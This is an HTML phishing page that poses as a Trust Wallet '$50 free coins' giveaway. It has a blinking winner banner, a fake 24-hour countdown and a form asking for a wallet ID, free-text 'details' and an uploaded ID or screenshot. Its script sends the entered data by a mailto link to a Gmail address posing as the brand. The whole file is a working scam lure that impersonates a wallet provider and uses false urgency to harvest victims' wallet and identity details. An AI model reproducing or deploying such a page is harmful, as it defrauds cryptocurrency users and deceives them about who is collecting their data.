<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet Free $50</title>
    <link rel="stylesheet" href="styles.css">
    <script defer src="script.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0d1117;
            color: #ffffff;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: #161b22;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 400px;
            animation: fadeIn 1s ease-in-out;
        }
        h1 {
            color: #58a6ff;
        }
        .wow-text {
            font-size: 18px;
            font-weight: bold;
            color: #ffcc00;
            animation: blink 1.5s infinite;
        }
        .countdown {
            font-size: 18px;
            margin: 10px 0;
            color: #ff4c4c;
        }
        input, textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background: #0d1117;
            color: white;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #58a6ff;
            border: none;
            color: white;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
            transition: background 0.3s;
        }
        button:hover {
            background: #1f6feb;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="wow-text">WOW! You might be the next winner!</div>
    <div class="countdown">Time left: <span id="timer"></span></div>
    
    <div class="container">
        <h1>Claim Your Free $50</h1>
        <p>Enter your details below to claim your free coins. (Not everyone qualifies)</p>
        
        <form id="claimForm">
            <label for="walletID">Trust Wallet ID:</label>
            <input type="text" id="walletID" required>
            
            <label for="details">Details:</label>
            <textarea id="details" required></textarea>
            
            <label for="image">Upload Proof (Screenshot, ID, etc.):</label>
            <input type="file" id="image" accept="image/*" required>
            
            <button type="submit">Submit & Send Email</button>
        </form>
    </div>
    
    <script>
        document.getElementById("claimForm").addEventListener("submit", function(event) {
            event.preventDefault();
            
            let walletID = document.getElementById("walletID").value;
            let details = document.getElementById("details").value;

            // Construct mailto link
            let mailtoLink = `mailto:trustwalletbethenext@gmail.com?subject=Free $50 Claim&body=Wallet ID: ${walletID}%0D%0ADetails: ${details}`;

            // Open Gmail app or website
            window.location.href = mailtoLink;
        });

        function startCountdown() {
            let countdownTime = localStorage.getItem("countdownTime");
            if (!countdownTime) {
                countdownTime = Date.now() + 24 * 60 * 60 * 1000;
                localStorage.setItem("countdownTime", countdownTime);
            }
            
            function updateTimer() {
                let now = Date.now();
                let timeLeft = countdownTime - now;
                if (timeLeft <= 0) {
                    document.getElementById("timer").innerText = "00:00:00";
                    localStorage.removeItem("countdownTime");
                } else {
                    let hours = Math.floor(timeLeft / (1000 * 60 * 60));
                    let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
                    let seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
                    document.getElementById("timer").innerText = `${hours}:${minutes}:${seconds}`;
                }
            }
            
            updateTimer();
            setInterval(updateTimer, 1000);
        }
        startCountdown();
    </script>
</body>
</html>
